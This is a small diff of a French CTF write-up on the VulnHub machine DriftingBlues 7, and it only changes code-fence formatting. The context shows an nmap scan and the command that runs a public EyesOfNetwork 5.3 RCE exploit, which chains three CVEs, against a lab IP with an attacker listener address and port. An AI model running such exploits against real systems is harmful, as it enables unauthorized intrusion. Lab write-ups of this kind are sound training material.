@@ -8,7 +8,7 @@ No bullshit
 
 Attaquons [le 7ème opus](https://www.vulnhub.com/entry/driftingblues-7,680/) de cette saga de CTF. Comme vous le verrez ça va être très succin.  
 
-```plain
+```
 Not shown: 65527 closed tcp ports (reset) 
 PORT     STATE SERVICE         VERSION 
 22/tcp   open  ssh             OpenSSH 7.4 (protocol 2.0) 
@@ -47,7 +47,7 @@ Il y a une appli web qui s'appelle *EyesOfNetwork* servie sur le port 443. Je ne
 
 L'exploit en question semble exploiter 3 CVEs pour parvenir à ses fins. Voyons ce que ça donne :  
 
-```plain
+```
 $ python /tmp/eonrce.py https://192.168.56.12/ -ip 192.168.56.1 -port 9999 
 +-----------------------------------------------------------------------------+ 
 | EyesOfNetwork 5.3 RCE (API v2.4.2)                                          | 
